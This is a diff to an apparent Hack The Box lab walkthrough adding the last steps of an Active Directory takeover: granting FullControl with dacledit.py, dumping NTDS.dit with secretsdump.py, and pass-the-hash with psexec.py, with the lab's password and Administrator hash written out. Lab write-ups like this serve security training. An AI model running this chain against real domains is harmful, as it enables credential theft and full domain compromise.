@@ -57,5 +57,13 @@
 
 `dacledit.py -action 'write' -rights 'FullControl' -principal 'svc-alfresco' -dc-ip dc01.htb.local -target-sid 'S-1-5-21-3072663084-364016917-1341370565' 'htb.local'/'svc-alfresco':'s3rvice'`
 
-8.
+8. Since we have FullControl over the HTB.LOCAL domain, we can dump the NTDS.dit using secretsdump.py
+
+`secretsdump.py "htb.local"/'svc-alfresco':'s3rvice'@10.129.95.210`
+
+9. This gives us the Administrator's NTLM hash that we can pass to gain remote code execution using psexec.py
+
+`psexec.py htb.local/administrator@10.129.95.210 -hashes ':32693b11e6aa90eb43d32c72a07ceea6'`
+
+10. Rooted machine!
 
